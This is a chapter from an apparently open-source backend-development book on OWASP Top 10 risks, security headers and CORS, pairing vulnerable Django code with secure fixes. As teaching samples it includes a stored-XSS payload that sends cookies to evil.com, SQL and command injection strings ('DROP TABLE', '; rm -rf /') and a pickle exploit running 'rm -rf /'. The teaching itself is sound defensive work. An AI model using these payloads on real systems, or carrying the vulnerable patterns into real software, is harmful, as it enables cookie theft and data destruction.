[Back to Chapter](README.md) | [Back to Book](../../README.md)

# 8.1 Application Security

### OWASP Top 10 Essentials

The Open Web Application Security Project (OWASP) maintains a regularly updated list of the most critical security risks to web applications. Every backend developer must understand these attack vectors and know how to defend against them. Below, each item is explained in depth with vulnerable and secure code examples.

#### Injection (SQL, NoSQL, Command, LDAP)

Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing data without proper authorization. SQL injection remains one of the most common and devastating attack vectors in web applications.

The root cause is almost always string concatenation or interpolation of user input directly into a query or command. The fix is equally straightforward: never build queries from raw user input. Use parameterized queries, ORMs, or prepared statements instead.

**VULNERABLE code -- SQL Injection via string formatting:**

```python
# DANGEROUS: Never do this!
def get_user(request):
    user_id = request.GET.get("id")
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()

# An attacker can pass: ?id=1 OR 1=1
# Resulting query: SELECT * FROM users WHERE id = 1 OR 1=1
# This returns ALL users in the database.

# Even worse: ?id=1; DROP TABLE users; --
# Resulting query: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
# This deletes the entire users table.
```

**SECURE code -- Parameterized query:**

```python
# SAFE: Use parameterized queries (placeholder syntax)
def get_user(request):
    user_id = request.GET.get("id")
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    return cursor.fetchone()

# The database driver treats user_id as a DATA value, never as SQL code.
# Even if the attacker passes "1 OR 1=1", it is treated as a literal string,
# and the query fails or returns no results.
```

**SECURE code -- Using Django ORM (safe by default):**

```python
# Django ORM handles parameterization automatically
from myapp.models import User

def get_user(request):
    user_id = request.GET.get("id")
    try:
        user = User.objects.get(pk=user_id)
    except User.DoesNotExist:
        raise Http404("User not found")
    return user

# The ORM generates parameterized SQL behind the scenes.
# HOWEVER, beware of raw queries:
# User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")  # STILL DANGEROUS
# User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])  # Safe
```

**VULNERABLE code -- NoSQL Injection (MongoDB):**

```python
# DANGEROUS: Passing unsanitized input directly to a MongoDB query
from pymongo import MongoClient

def login(request):
    username = request.POST.get("username")
    password = request.POST.get("password")
    user = db.users.find_one({"username": username, "password": password})
    # An attacker can send JSON: {"username": {"$ne": ""}, "password": {"$ne": ""}}
    # This matches any document where username and password are not empty -- i.e., everyone.
```

**SECURE code -- NoSQL with type checking:**

```python
# SAFE: Validate types before querying
def login(request):
    username = request.POST.get("username")
    password = request.POST.get("password")

    # Ensure inputs are strings, not dicts/operators
    if not isinstance(username, str) or not isinstance(password, str):
        return HttpResponseBadRequest("Invalid input")

    user = db.users.find_one({"username": username})
    if user and check_password(password, user["password_hash"]):
        # Authenticate
        ...
```

**VULNERABLE code -- Command Injection:**

```python
# DANGEROUS: Passing user input into a shell command
import os

def ping_host(request):
    host = request.GET.get("host")
    result = os.system(f"ping -c 4 {host}")
    # Attacker sends: ?host=8.8.8.8; rm -rf /
    # The shell executes: ping -c 4 8.8.8.8; rm -rf /
```

**SECURE code -- Avoiding shell injection:**

```python
# SAFE: Use subprocess with a list (no shell interpretation)
import subprocess

def ping_host(request):
    host = request.GET.get("host")

    # Validate input format
    import re
    if not re.match(r'^[\d\.]+$', host):
        return HttpResponseBadRequest("Invalid host")

    result = subprocess.run(
        ["ping", "-c", "4", host],
        capture_output=True,
        text=True,
        shell=False  # Critical: do NOT use shell=True
    )
    return HttpResponse(result.stdout)
```

Additional prevention measures for injection attacks:
- Use an ORM for database access whenever possible. ORMs generate parameterized queries by default.
- Apply the principle of least privilege to your database user. The application's DB account should only have SELECT, INSERT, UPDATE, and DELETE permissions on the specific tables it needs. It should never have DROP, CREATE, or GRANT permissions.
- Use stored procedures where appropriate, as they provide an additional layer of abstraction.
- Implement input validation as a defense-in-depth measure (not as a primary defense against injection).

> **Key Takeaway:** Injection attacks are preventable with one rule: never concatenate user input into queries or commands. Always use parameterized queries, ORM methods, or subprocess calls with argument lists. Treat every piece of user input as potentially hostile.

---

#### Broken Authentication

Broken authentication encompasses a wide range of vulnerabilities: weak password storage, credential stuffing (using leaked username/password pairs from other breaches), session fixation, and insufficient brute-force protection. When authentication is compromised, attackers gain access to user accounts and potentially the entire system.

**VULNERABLE code -- Storing passwords with MD5:**

```python
# DANGEROUS: MD5/SHA are not suitable for password hashing
import hashlib

def register_user(username, password):
    password_hash = hashlib.md5(password.encode()).hexdigest()
    # MD5 is extremely fast, making brute-force trivial.
    # A modern GPU can compute billions of MD5 hashes per second.
    # Rainbow tables exist for most common MD5-hashed passwords.
    db.execute("INSERT INTO users (username, password) VALUES (%s, %s)",
               (username, password_hash))
```

**SECURE code -- Using bcrypt/Argon2:**

```python
# SAFE: Use bcrypt (or argon2) -- slow, salted, and purpose-built for passwords
# Option A: bcrypt
import bcrypt

def register_user(username, password):
    # bcrypt auto-generates a salt and includes it in the hash
    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
    db.execute("INSERT INTO users (username, password_hash) VALUES (%s, %s)",
               (username, password_hash.decode('utf-8')))

def verify_password(password, stored_hash):
    return bcrypt.checkpw(password.encode('utf-8'), stored_hash.encode('utf-8'))


# Option B: Argon2 (recommended by OWASP as of 2024)
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # Number of iterations
    memory_cost=65536,  # 64 MB of memory
    parallelism=4,      # Number of threads
)

def register_user(username, password):
    password_hash = ph.hash(password)
    db.execute("INSERT INTO users (username, password_hash) VALUES (%s, %s)",
               (username, password_hash))

def verify_password(password, stored_hash):
    try:
        return ph.verify(stored_hash, password)
    except Exception:
        return False


# Option C: Django built-in (uses PBKDF2 by default, can be configured for Argon2)
# settings.py
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.Argon2PasswordHasher',  # preferred
    'django.contrib.auth.hashers.PBKDF2PasswordHasher',  # fallback for old hashes
]
```

**SECURE code -- Account lockout with progressive delay:**

```python
from django.core.cache import cache
from django.http import JsonResponse
import time

MAX_ATTEMPTS = 5
LOCKOUT_BASE_SECONDS = 60  # 1 minute base lockout

def login_view(request):
    username = request.POST.get("username")
    ip_address = get_client_ip(request)

    # Track by both IP and account to prevent distributed attacks
    ip_key = f"login_attempts:ip:{ip_address}"
    account_key = f"login_attempts:account:{username}"

    ip_attempts = cache.get(ip_key, 0)
    account_attempts = cache.get(account_key, 0)

    # Progressive delay: doubles with each failed attempt beyond the threshold
    if account_attempts >= MAX_ATTEMPTS:
        lockout_duration = LOCKOUT_BASE_SECONDS * (2 ** (account_attempts - MAX_ATTEMPTS))
        return JsonResponse(
            {"error": f"Account locked. Try again in {lockout_duration} seconds."},
            status=429
        )

    if ip_attempts >= MAX_ATTEMPTS * 3:
        return JsonResponse({"error": "Too many attempts from this IP."}, status=429)

    user = authenticate(username=username, password=request.POST.get("password"))
    if user is None:
        cache.set(ip_key, ip_attempts + 1, timeout=3600)
        cache.set(account_key, account_attempts + 1, timeout=3600)
        return JsonResponse({"error": "Invalid credentials."}, status=401)

    # Reset counters on successful login
    cache.delete(ip_key)
    cache.delete(account_key)
    login(request, user)
    return JsonResponse({"message": "Login successful."})
```

Additional best practices for authentication:
- Enforce multi-factor authentication (MFA) for sensitive operations and privileged accounts.
- Set session tokens to expire after a reasonable period of inactivity (e.g., 30 minutes for sensitive applications).
- Regenerate session IDs after login to prevent session fixation attacks.
- Use secure, HttpOnly, SameSite cookies for session management.
- Implement password complexity requirements: minimum length of 12 characters, check against known breached password lists (e.g., HaveIBeenPwned API).

> **Key Takeaway:** Never use fast hashing algorithms (MD5, SHA-1, SHA-256) for passwords. Use bcrypt or Argon2 with appropriate cost factors. Combine strong password hashing with MFA, account lockout, and secure session management for defense in depth.

---

#### XSS (Cross-Site Scripting)

Cross-Site Scripting attacks occur when an application includes untrusted data in a web page without proper validation or escaping. XSS allows attackers to execute scripts in the victim's browser, potentially stealing session cookies, defacing websites, or redirecting users to malicious sites.

There are three main types:
- **Stored XSS**: The malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment). Every user who views the affected page executes the script.
- **Reflected XSS**: The malicious script is part of the request (e.g., in a URL query parameter) and is immediately reflected back in the response.
- **DOM-based XSS**: The vulnerability exists in client-side JavaScript code that processes data from an untrusted source (e.g., `document.location`, `document.URL`).

**VULNERABLE code -- Stored XSS:**

```python
# DANGEROUS: Rendering user input without escaping
# views.py
def post_comment(request):
    comment_text = request.POST.get("comment")
    # Stored directly in database without sanitization
    Comment.objects.create(user=request.user, text=comment_text)
    return redirect("/comments/")

# template (comment_list.html) -- DANGEROUS
# <div class="comment">{{ comment.text|safe }}</div>
# The |safe filter tells Django to NOT escape the content.
# If an attacker posts: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
# Every user who views the comments page will have their cookies stolen.
```

**SECURE code -- Proper output encoding:**

```python
# SAFE: Django templates auto-escape by default
# views.py -- same as above, but the template is different

# template (comment_list.html) -- SAFE
# <div class="comment">{{ comment.text }}</div>
# Without the |safe filter, Django auto-escapes HTML entities:
# <script> becomes &lt;script&gt; and is displayed as text, not executed.

# For extra safety, sanitize input on the way in too (defense in depth):
import bleach

def post_comment(request):
    comment_text = request.POST.get("comment")
    # Strip all HTML tags, or allow only a safe subset
    clean_text = bleach.clean(comment_text, tags=[], strip=True)
    # Or allow limited formatting:
    # clean_text = bleach.clean(comment_text, tags=['b', 'i', 'em', 'strong'], strip=True)
    Comment.objects.create(user=request.user, text=clean_text)
    return redirect("/comments/")
```

**VULNERABLE code -- Reflected XSS:**

```python
# DANGEROUS: Reflecting user input directly in the response
def search(request):
    query = request.GET.get("q", "")
    # Directly embedding in HTML without escaping
    return HttpResponse(f"<h1>Search results for: {query}</h1>")
    # Attacker crafts URL: /search?q=<script>alert('XSS')</script>
    # Anyone clicking this link executes the script.
```

**SECURE code -- Escaped output:**

```python
# SAFE: Use Django's template engine which auto-escapes
from django.shortcuts import render

def search(request):
    query = request.GET.get("q", "")
    return render(request, "search_results.html", {"query": query})

# search_results.html:
# <h1>Search results for: {{ query }}</h1>
# Django automatically escapes {{ query }}, neutralizing any HTML/JS.

# If you MUST build HTML in Python, use markupsafe:
from markupsafe import escape

def search(request):
    query = request.GET.get("q", "")
    safe_query = escape(query)
    return HttpResponse(f"<h1>Search results for: {safe_query}</h1>")
```

**Content Security Policy (CSP)** is a critical defense against XSS. Even if an XSS vulnerability exists, a strong CSP can prevent the injected script from executing:

```python
# Django middleware to add CSP headers
# settings.py -- using django-csp package
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)  # Only allow scripts from your own domain
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")  # Inline styles if needed
CSP_IMG_SRC = ("'self'", "data:", "https://cdn.example.com")
CSP_FONT_SRC = ("'self'", "https://fonts.googleapis.com")
CSP_CONNECT_SRC = ("'self'", "https://api.example.com")
CSP_FRAME_ANCESTORS = ("'none'",)  # Prevent framing (clickjacking protection)
CSP_REPORT_URI = "/csp-report/"  # Receive violation reports

# This generates a header like:
# Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

Always set HttpOnly on session cookies so that JavaScript cannot access them, even if XSS occurs:

```python
# settings.py
SESSION_COOKIE_HTTPONLY = True   # Prevents JavaScript from reading session cookie
SESSION_COOKIE_SECURE = True    # Only send cookie over HTTPS
CSRF_COOKIE_HTTPONLY = True     # Also protect the CSRF cookie
```

> **Key Takeaway:** XSS prevention requires context-aware output encoding. Use your template engine's auto-escaping, sanitize rich-text input with libraries like bleach, deploy a strong Content Security Policy, and always set HttpOnly on sensitive cookies.

---

#### CSRF (Cross-Site Request Forgery)

CSRF attacks trick an authenticated user's browser into sending a forged request to a vulnerable web application. Because the browser automatically attaches cookies (including session cookies) to every request to the target domain, the server cannot distinguish the forged request from a legitimate one.

Example scenario: A user is logged into their bank at `bank.com`. They visit a malicious page that contains `<img src="https://bank.com/transfer?to=attacker&amount=10000">`. The browser sends the request with the user's session cookie, and the transfer executes.

**VULNERABLE code -- No CSRF protection:**

```python
# DANGEROUS: No CSRF token validation
# views.py
def transfer_money(request):
    if request.method == "POST":
        to_account = request.POST.get("to")
        amount = request.POST.get("amount")
        perform_transfer(request.user, to_account, amount)
        return HttpResponse("Transfer complete")

# template:
# <form method="POST" action="/transfer/">
#     <input name="to" value="">
#     <input name="amount" value="">
#     <button>Transfer</button>
# </form>
# No CSRF token -- any website can submit this form on behalf of the user.
```

**SECURE code -- Django CSRF protection:**

```python
# SAFE: Django's built-in CSRF protection
# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',  # Enabled by default
    # ...
]

# template:
# <form method="POST" action="/transfer/">
#     {% csrf_token %}
#     <input name="to" value="">
#     <input name="amount" value="">
#     <button>Transfer</button>
# </form>
# Django generates a unique token per session. The form includes it as a hidden field.
# On POST, Django verifies the token matches. An attacker's page cannot read this token
# due to the Same-Origin Policy.

# For AJAX requests (e.g., with fetch or axios):
# Read the CSRF token from the cookie and include it in the request header.
# JavaScript example:
# function getCookie(name) {
#     const value = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
#     return value ? value.pop() : '';
# }
# fetch('/api/transfer/', {
#     method: 'POST',
#     headers: {
#         'Content-Type': 'application/json',
#         'X-CSRFToken': getCookie('csrftoken'),
#     },
#     body: JSON.stringify({to: '...', amount: 100}),
# });
```

**SECURE code -- SameSite cookie attribute:**

```python
# settings.py
SESSION_COOKIE_SAMESITE = 'Lax'    # Default in modern Django
# 'Lax': Cookie is sent with top-level navigations and GET requests from third-party sites.
#         POST requests from third-party sites will NOT include the cookie.
# 'Strict': Cookie is never sent with any cross-site request.
# 'None': Cookie is always sent (requires SESSION_COOKIE_SECURE = True).

SESSION_COOKIE_SECURE = True        # Only send over HTTPS
CSRF_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SECURE = True
```

Additional CSRF defenses:
- Always verify the `Origin` and `Referer` headers on state-changing requests as an additional check.
- For API-only backends using token authentication (e.g., JWT in Authorization header), CSRF is not a concern because the browser does not automatically attach the token. CSRF is specifically a cookie-based vulnerability.
- Use the `Lax` SameSite attribute as a baseline. Use `Strict` for highly sensitive applications.

> **Key Takeaway:** CSRF exploits the browser's automatic inclusion of cookies in requests. Defend with CSRF tokens (Django provides them by default), SameSite cookie attributes, and Origin/Referer header validation. For token-based APIs (JWT in headers), CSRF is not applicable.

---

#### Broken Access Control

Broken access control occurs when users can act outside their intended permissions. This includes accessing other users' data by modifying a URL parameter (Insecure Direct Object Reference, or IDOR), escalating privileges from a regular user to an admin, or bypassing access controls by modifying the request.

**VULNERABLE code -- IDOR (Insecure Direct Object Reference):**

```python
# DANGEROUS: No authorization check
def view_invoice(request, invoice_id):
    invoice = Invoice.objects.get(id=invoice_id)
    # Any authenticated user can view ANY invoice by changing the ID in the URL.
    # /invoices/123/ -> /invoices/456/ (another user's invoice)
    return render(request, "invoice.html", {"invoice": invoice})
```

**SECURE code -- Proper authorization check:**

```python
# SAFE: Verify ownership before granting access
from django.http import HttpResponseForbidden

def view_invoice(request, invoice_id):
    invoice = Invoice.objects.get(id=invoice_id)
    if invoice.user != request.user:
        return HttpResponseForbidden("You do not have access to this resource.")
    return render(request, "invoice.html", {"invoice": invoice})

# Even better: filter at the query level so unauthorized records are never loaded
def view_invoice(request, invoice_id):
    try:
        invoice = Invoice.objects.get(id=invoice_id, user=request.user)
    except Invoice.DoesNotExist:
        raise Http404("Invoice not found")
    return render(request, "invoice.html", {"invoice": invoice})
```

**VULNERABLE code -- Relying on client-side role checks:**

```python
# DANGEROUS: Only checking role on the frontend
# Frontend JavaScript:
# if (user.role === 'admin') { showAdminPanel(); }
# An attacker can simply call the API directly, bypassing the frontend check.

# Backend with no server-side check:
def delete_user(request, user_id):
    User.objects.get(id=user_id).delete()
    return JsonResponse({"message": "User deleted"})
```

**SECURE code -- Server-side authorization:**

```python
# SAFE: Always enforce permissions server-side
from django.contrib.auth.decorators import login_required, user_passes_test
from functools import wraps

def admin_required(view_func):
    @wraps(view_func)
    def wrapper(request, *args, **kwargs):
        if not request.user.is_authenticated:
            return JsonResponse({"error": "Authentication required"}, status=401)
        if not request.user.is_staff:
            return JsonResponse({"error": "Admin access required"}, status=403)
        return view_func(request, *args, **kwargs)
    return wrapper

@admin_required
def delete_user(request, user_id):
    User.objects.get(id=user_id).delete()
    return JsonResponse({"message": "User deleted"})

# Django REST Framework approach with permission classes:
from rest_framework.permissions import IsAdminUser
from rest_framework.views import APIView

class DeleteUserView(APIView):
    permission_classes = [IsAdminUser]

    def delete(self, request, user_id):
        User.objects.get(id=user_id).delete()
        return Response({"message": "User deleted"})
```

Best practices for access control:
- Deny by default. Every endpoint should require authentication and authorization unless explicitly marked as public.
- Test authorization for every endpoint with different user roles: unauthenticated, regular user, admin, and users trying to access other users' resources.
- Use UUIDs instead of sequential integer IDs to make IDOR attacks harder to enumerate (though this is not a replacement for proper authorization checks).
- Log all access control failures for security monitoring.

> **Key Takeaway:** Never trust the client for access control decisions. Enforce authorization on every server-side endpoint. Filter data at the query level so users never even load data they should not see. Deny by default and require explicit permission grants.

---

#### Security Misconfiguration

Security misconfiguration is one of the most common issues in production systems. It includes leaving default credentials in place, exposing debug information, running unnecessary services, using permissive CORS policies, and failing to set security headers. These are often the easiest vulnerabilities for attackers to exploit and the easiest to prevent.

**VULNERABLE configuration -- Django DEBUG in production:**

```python
# DANGEROUS: Debug mode in production exposes sensitive information
# settings.py
DEBUG = True  # Shows full stack traces, database queries, settings values
ALLOWED_HOSTS = ['*']  # Accepts requests for any hostname

# When an error occurs, Django shows:
# - Full Python traceback
# - Local variables at each frame
# - Database query log
# - All Django settings (potentially including SECRET_KEY)
```

**SECURE configuration -- Production Django settings:**

```python
# settings.py (production)
import os

DEBUG = False
ALLOWED_HOSTS = ['www.example.com', 'example.com']
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')  # Never hardcode

# Use a proper error reporting service
LOGGING = {
    'version': 1,
    'handlers': {
        'sentry': {
            'level': 'ERROR',
            'class': 'sentry_sdk.integrations.logging.EventHandler',
        },
    },
    'root': {
        'handlers': ['sentry'],
        'level': 'ERROR',
    },
}

# Ensure secure defaults
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000  # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

> **Key Takeaway:** Security misconfiguration is the gap between "it works" and "it works securely." Use hardening checklists, automate security scanning in CI/CD, never use default credentials, disable DEBUG in production, and deploy all recommended security headers.

---

#### Insecure Deserialization

Insecure deserialization occurs when an application deserializes data from an untrusted source without validation. Attackers can manipulate serialized objects to execute arbitrary code, perform injection attacks, or escalate privileges. This is particularly dangerous in languages and libraries that support object serialization with full code execution capabilities.

**VULNERABLE code -- Using Python pickle with untrusted data:**

```python
# DANGEROUS: pickle can execute arbitrary code during deserialization
import pickle
import base64

def load_user_preferences(request):
    data = request.COOKIES.get("preferences")
    preferences = pickle.loads(base64.b64decode(data))
    # An attacker can craft a malicious pickle payload that executes arbitrary commands:
    #
    # import pickle, os
    # class Exploit:
    #     def __reduce__(self):
    #         return (os.system, ('rm -rf /',))
    # payload = base64.b64encode(pickle.dumps(Exploit()))
    #
    # When the server deserializes this cookie, it executes os.system('rm -rf /')
    return preferences
```

**SECURE code -- Using JSON (safe format):**

```python
# SAFE: JSON only supports primitive types -- no code execution possible
import json

def load_user_preferences(request):
    data = request.COOKIES.get("preferences")
    try:
        preferences = json.loads(data)
    except (json.JSONDecodeError, TypeError):
        preferences = get_default_preferences()

    # Validate the structure
    allowed_keys = {"theme", "language", "timezone"}
    preferences = {k: v for k, v in preferences.items() if k in allowed_keys}
    return preferences


# If you MUST use serialization with more complex types, use signing:
from django.core.signing import Signer, BadSignature

signer = Signer()

def save_preferences(preferences):
    """Sign data before storing -- prevents tampering."""
    return signer.sign_object(preferences)

def load_preferences(signed_data):
    """Verify signature before deserializing."""
    try:
        return signer.unsign_object(signed_data)
    except BadSignature:
        return get_default_preferences()
```

Additional prevention measures:
- Never deserialize data from untrusted sources using `pickle`, `yaml.load()` (use `yaml.safe_load()` instead), or Java's `ObjectInputStream` without strict filtering.
- Implement integrity checks (HMAC, digital signatures) on serialized objects.
- Log deserialization failures as potential attack indicators.
- Monitor and restrict which classes can be deserialized if you must use object serialization.

> **Key Takeaway:** Never deserialize untrusted data with formats that support code execution (pickle, Java serialization, YAML unsafe load). Use JSON for data interchange. When complex serialization is necessary, always sign and verify the data first.

---

### Input Validation & Security Headers

#### Whitelist Validation

Whitelist validation (also called allowlist validation) is the practice of defining exactly what input is acceptable and rejecting everything else. This is fundamentally more secure than blacklist validation, which tries to enumerate all dangerous inputs -- an approach that inevitably misses edge cases and novel attack vectors.

For example, if a field should contain a username, define that a valid username consists of 3-30 alphanumeric characters, hyphens, and underscores. Reject anything that does not match this pattern, rather than trying to strip out dangerous characters.

```python
import re
from django import forms
from django.core.validators import RegexValidator

# Django form with whitelist validation
class RegistrationForm(forms.Form):
    username = forms.CharField(
        min_length=3,
        max_length=30,
        validators=[
            RegexValidator(
                regex=r'^[a-zA-Z0-9_-]+$',
                message='Username may only contain letters, numbers, hyphens, and underscores.'
            )
        ]
    )
    email = forms.EmailField()  # Django validates email format
    age = forms.IntegerField(min_value=13, max_value=150)

    def clean_username(self):
        username = self.cleaned_data['username']
        # Additional business logic validation
        if username.lower() in ['admin', 'root', 'system', 'superuser']:
            raise forms.ValidationError("This username is reserved.")
        return username


# Manual validation example for API views
def validate_search_query(query: str) -> str:
    """Whitelist approach: define what is allowed."""
    if not query or len(query) > 200:
        raise ValueError("Query must be 1-200 characters")
    # Allow only alphanumeric, spaces, and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s.,!?\'-]+$', query):
        raise ValueError("Query contains invalid characters")
    return query.strip()
```

#### Parameterized Queries

Parameterized queries are the primary defense against SQL injection. They separate the query structure from the data, ensuring that user input is always treated as a literal value and never as part of the SQL command.

```python
# Different parameterized query patterns in Python:

# 1. Raw DB-API with psycopg2 (PostgreSQL)
import psycopg2

conn = psycopg2.connect(database="mydb")
cursor = conn.cursor()

# Positional parameters (%s)
cursor.execute(
    "SELECT * FROM products WHERE category = %s AND price < %s",
    ("electronics", 100.00)
)

# Named parameters (%(name)s)
cursor.execute(
    "SELECT * FROM products WHERE category = %(cat)s AND price < %(max_price)s",
    {"cat": "electronics", "max_price": 100.00}
)

# 2. SQLAlchemy (ORM and Core)
from sqlalchemy import text

# Core with bound parameters
with engine.connect() as conn:
    result = conn.execute(
        text("SELECT * FROM products WHERE category = :cat AND price < :max_price"),
        {"cat": "electronics", "max_price": 100.00}
    )

# ORM (always parameterized)
products = session.query(Product).filter(
    Product.category == "electronics",
    Product.price < 100.00
).all()

# 3. Django ORM
products = Product.objects.filter(category="electronics", price__lt=100.00)

# Django raw query (still parameterized)
products = Product.objects.raw(
    "SELECT * FROM products WHERE category = %s AND price < %s",
    ["electronics", 100.00]
)
```

#### Security Headers

Security headers instruct the browser on how to behave when handling your site's content. They are a critical layer of defense that can mitigate XSS, clickjacking, MIME-type attacks, and other browser-based vulnerabilities.

**Django middleware configuration for security headers:**

```python
# settings.py

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',  # Must be near the top
    'django.middleware.csrf.CsrfViewMiddleware',
    # ...
]

# HSTS: Force HTTPS for all future requests
SECURE_HSTS_SECONDS = 31536000            # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True     # Apply to all subdomains
SECURE_HSTS_PRELOAD = True                # Submit to browser preload list
SECURE_SSL_REDIRECT = True                # Redirect HTTP to HTTPS

# Prevent MIME-type sniffing
SECURE_CONTENT_TYPE_NOSNIFF = True        # X-Content-Type-Options: nosniff

# Clickjacking protection
X_FRAME_OPTIONS = 'DENY'                 # X-Frame-Options: DENY

# CSP (using django-csp package)
# pip install django-csp
MIDDLEWARE += ['csp.middleware.CSPMiddleware']
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'", "https://fonts.googleapis.com")
CSP_IMG_SRC = ("'self'", "data:", "https:")
CSP_FONT_SRC = ("'self'", "https://fonts.gstatic.com")
CSP_FRAME_ANCESTORS = ("'none'",)


# Custom middleware for additional headers
class SecurityHeadersMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        response['X-Content-Type-Options'] = 'nosniff'
        response['X-Frame-Options'] = 'DENY'
        response['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        response['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
        # X-XSS-Protection is deprecated; CSP replaces it.
        # Setting it to 0 avoids bugs in older browser implementations.
        response['X-XSS-Protection'] = '0'
        return response
```

**Nginx security headers configuration:**

```nginx
# /etc/nginx/conf.d/security-headers.conf
# Include this in your server block or http block.

# Force HTTPS (HSTS)
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# Prevent MIME-type sniffing
add_header X-Content-Type-Options "nosniff" always;

# Prevent clickjacking
add_header X-Frame-Options "DENY" always;

# Control referrer information
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Content Security Policy
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;

# Disable browser features you do not use
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;

# Disable the X-XSS-Protection header (CSP is the modern replacement)
add_header X-XSS-Protection "0" always;


# Full server block example:
server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    # Modern TLS configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # Include security headers
    include /etc/nginx/conf.d/security-headers.conf;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

#### CORS (Cross-Origin Resource Sharing)

CORS controls which external domains can make requests to your API. A misconfigured CORS policy can expose your API to cross-origin attacks, while an overly restrictive policy will break legitimate frontend applications.

**VULNERABLE CORS configuration:**

```python
# DANGEROUS: Allowing all origins with credentials
# This effectively disables the Same-Origin Policy.
CORS_ALLOW_ALL_ORIGINS = True
CORS_ALLOW_CREDENTIALS = True
# An attacker's website can now make authenticated requests to your API.
```

**SECURE CORS configuration (using django-cors-headers):**

```python
# pip install django-cors-headers

# settings.py
INSTALLED_APPS = [
    'corsheaders',
    # ...
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Must be placed before CommonMiddleware
    'django.middleware.common.CommonMiddleware',
    # ...
]

# Specify exact allowed origins (never use * with credentials)
CORS_ALLOWED_ORIGINS = [
    "https://www.example.com",
    "https://app.example.com",
]

# For development, you might add local origins
# CORS_ALLOWED_ORIGINS += ["http://localhost:3000"] if DEBUG else []

# Allow credentials (cookies, auth headers)
CORS_ALLOW_CREDENTIALS = True

# Restrict allowed methods
CORS_ALLOW_METHODS = [
    'GET',
    'POST',
    'PUT',
    'PATCH',
    'DELETE',
    'OPTIONS',
]

# Restrict allowed headers
CORS_ALLOW_HEADERS = [
    'accept',
    'authorization',
    'content-type',
    'x-csrftoken',
    'x-requested-with',
]

# How long the browser can cache the preflight response (in seconds)
CORS_PREFLIGHT_MAX_AGE = 86400  # 24 hours

# Expose specific response headers to the frontend
CORS_EXPOSE_HEADERS = [
    'X-Total-Count',
    'X-Page-Count',
]
```

**Nginx CORS configuration (for static assets or reverse proxy):**

```nginx
# Handle CORS at the nginx level (alternative to application-level)
location /api/ {
    # Preflight request handling
    if ($request_method = 'OPTIONS') {
        add_header 'Access-Control-Allow-Origin' 'https://www.example.com' always;
        add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
        add_header 'Access-Control-Allow-Headers' 'Authorization, Content-Type, X-CSRFToken' always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        add_header 'Access-Control-Max-Age' 86400;
        add_header 'Content-Length' 0;
        return 204;
    }

    # Actual request headers
    add_header 'Access-Control-Allow-Origin' 'https://www.example.com' always;
    add_header 'Access-Control-Allow-Credentials' 'true' always;

    proxy_pass http://127.0.0.1:8000;
}
```

Understanding preflight requests: When a browser makes a "non-simple" request (e.g., with custom headers, PUT/DELETE methods, or JSON content type), it first sends an OPTIONS request to check whether the actual request is allowed. Your server must respond to this OPTIONS request with the appropriate CORS headers. If the preflight fails, the browser blocks the actual request.

#### File Upload Security

File uploads are a significant attack surface. Malicious files can contain executable code, exploit image-processing vulnerabilities, or consume excessive storage.

```python
import magic  # python-magic library
import uuid
import os
from django.conf import settings

ALLOWED_MIME_TYPES = {
    'image/jpeg', 'image/png', 'image/gif', 'image/webp',
    'application/pdf',
}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

